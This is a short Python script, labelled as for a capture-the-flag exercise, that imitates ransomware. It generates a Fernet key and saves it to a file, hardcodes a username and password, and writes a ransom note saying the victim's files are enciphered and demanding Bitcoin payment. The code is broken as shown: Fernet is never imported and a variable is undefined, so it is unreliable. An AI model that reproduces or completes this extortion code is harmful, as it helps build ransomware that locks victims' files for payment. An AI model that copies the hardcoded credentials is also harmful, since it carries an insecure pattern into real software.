import urllib
import re

def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

#THIS IS FOR CTF PURPOSE ONLY

user="johndecuy"
pwd="rtyu4567ETRYD!!"


f = open("readz_decryptzz.txt", "a")
f.write("Attention: "+custid)
f.write("It's been unfortunate to inform you that all your precious files are now enciphered.")
f.write("We believe that you can do your best to retrieve it from us.")
f.write("If you want it, please send us your payment via Bitcoin wallet.")
f.close()

#open and read the file after the appending:
f = open("readz_decryptzz.txt", "r")
print(f.read())
